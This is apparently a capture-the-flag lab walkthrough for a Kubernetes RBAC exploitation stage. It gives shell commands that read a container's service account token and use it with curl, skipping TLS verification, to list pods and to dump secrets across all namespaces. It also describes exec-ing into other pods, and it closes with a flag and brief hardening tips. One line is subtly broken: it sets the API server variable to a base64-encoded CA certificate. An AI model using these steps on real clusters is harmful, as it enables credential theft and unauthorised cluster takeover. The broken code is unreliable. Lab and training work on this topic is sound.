# Layer 3: Kubernetes & RBAC Exploitation

## Objective
Exploit Kubernetes RBAC misconfigurations to gain cluster-wide access.

## Prerequisites
- Escape the container
- Access to kubectl or Kubernetes API
- Service account token available at `/var/run/secrets/kubernetes.io/serviceaccount/token`

## Exploitation Steps

### 1. Discover Service Account Token
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 2. Enumerate Kubernetes Resources
```bash
# Set API server
APISERVER=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt | base64)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Try to list pods
curl --header "Authorization: Bearer $TOKEN" \
  --insecure \
  https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/pods
```

### 3. Exploit Overpermissive RBAC
The deployment has a misconfigured ServiceAccount with:
- `pods/exec` permission across namespaces
- `secrets/get` permission
- `configmaps/list` permission

Use these to:
- Execute commands in other pods
- Read secrets
- Access configuration data

### 4. Read Cluster Secrets
```bash
# List secrets in all namespaces
curl --header "Authorization: Bearer $TOKEN" \
  --insecure \
  https://kubernetes.default.svc.cluster.local/api/v1/secrets
```

## Flag 3
`CTF{RBAC_MISCONFIGURATION_EXPLOITED}`

## Kubernetes Security Best Practices
- Use least privilege service accounts
- Implement network policies
- Enable audit logging
- Use Pod Security Policies/Standards
